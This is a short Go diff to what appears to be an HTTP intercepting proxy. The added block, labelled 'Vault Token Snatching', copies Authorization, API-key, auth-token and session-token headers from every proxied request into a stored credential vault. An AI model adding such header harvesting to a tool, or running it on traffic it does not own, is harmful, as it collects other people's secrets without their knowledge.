@@ -80,6 +80,14 @@ func main() {
 			// Force uncompressed responses so we can read the JSON bodies
 			r.Header.Del("Accept-Encoding")
 			
+			// Vault Token Snatching
+			authHeaders := []string{"Authorization", "X-Api-Key", "X-Auth-Token", "Session-Token"}
+			for _, h := range authHeaders {
+				if val := r.Header.Get(h); val != "" {
+					specManager.SaveVaultCredential(h, val)
+				}
+			}
+
 			// Clean terminal output - Method and Path, aligned
 			fmt.Printf("[REQ]  %-6s %s\n", r.Method, r.URL.Path)
 			return r, nil
